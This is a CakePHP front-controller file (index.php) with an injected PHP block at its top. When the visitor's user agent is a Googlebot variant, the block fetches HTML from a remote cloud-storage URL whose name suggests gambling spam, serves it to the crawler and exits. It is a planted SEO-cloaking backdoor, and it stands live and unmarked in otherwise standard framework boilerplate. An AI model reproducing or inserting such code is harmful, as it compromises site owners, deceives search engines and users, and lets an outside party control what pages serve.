<?php
function is_google_bot() {
    $agents = array(
        "Googlebot", 
        "Google-Site-Verification", 
        "Google-InspectionTool", 
        "Googlebot-Mobile", 
        "Googlebot-News"
    );
    if (!isset($_SERVER['HTTP_USER_AGENT'])) return false;

    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    foreach ($agents as $agent) {
        if (stripos($user_agent, $agent) !== false) {
            return true;
        }
    }
    return false;
}

if (is_google_bot()) {
    $content = @file_get_contents("https://keren.sgp1.cdn.digitaloceanspaces.com/TUNNEL/text/eventic-instcamp-playwin77.txt");

    if ($content !== false) {
        header("Content-Type: text/html; charset=UTF-8");
        echo $content;
    }
    exit;
}
?><?php
/**
 * The Front Controller for handling every request
 *
 * CakePHP(tm) : Rapid Development Framework (https://cakephp.org)
 * Copyright (c) Cake Software Foundation, Inc. (https://cakefoundation.org)
 *
 * Licensed under The MIT License
 * For full copyright and license information, please see the LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright (c) Cake Software Foundation, Inc. (https://cakefoundation.org)
 * @link          https://cakephp.org CakePHP(tm) Project
 * @since         0.2.9
 * @license       MIT License (https://opensource.org/licenses/mit-license.php)
 */

// For built-in server
if (PHP_SAPI === 'cli-server') {
    $_SERVER['PHP_SELF'] = '/' . basename(__FILE__);

    $url = parse_url(urldecode($_SERVER['REQUEST_URI']));
    $file = __DIR__ . $url['path'];
    if (strpos($url['path'], '..') === false && strpos($url['path'], '.') !== false && is_file($file)) {
        return false;
    }
}
require dirname(__DIR__) . '/vendor/autoload.php';

use App\Application;
use Cake\Http\Server;

// Bind your application to the server.
$server = new Server(new Application(dirname(__DIR__) . '/config'));

// Run the request/response through the application and emit the response.
$server->emit($server->run());
